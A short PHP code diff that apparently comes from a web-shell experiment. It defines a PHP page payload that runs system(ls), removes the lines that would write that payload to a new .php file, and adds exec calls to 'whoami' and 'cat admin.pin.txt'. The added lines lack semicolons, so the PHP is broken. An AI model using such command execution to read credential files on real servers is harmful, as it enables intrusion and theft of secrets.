@@ -4,9 +4,9 @@ $pagename = 'my_page1';
 $newFileName = './'.$pagename.".php";
 $newFileContent = '<?php echo "here we are"; echo system(ls);?>';
 echo exec('ls');
-if (file_put_contents($newFileName, $newFileContent) !== false) {
-    echo "File created (" . basename($newFileName) . ")";
-} else {
-    echo "Cannot create file (" . basename($newFileName) . ")";
-}
+echo "space  \n"
+echo exec('whoami');
+echo "space  \n"
+echo exec('cat admin.pin.txt');
 ?>
+
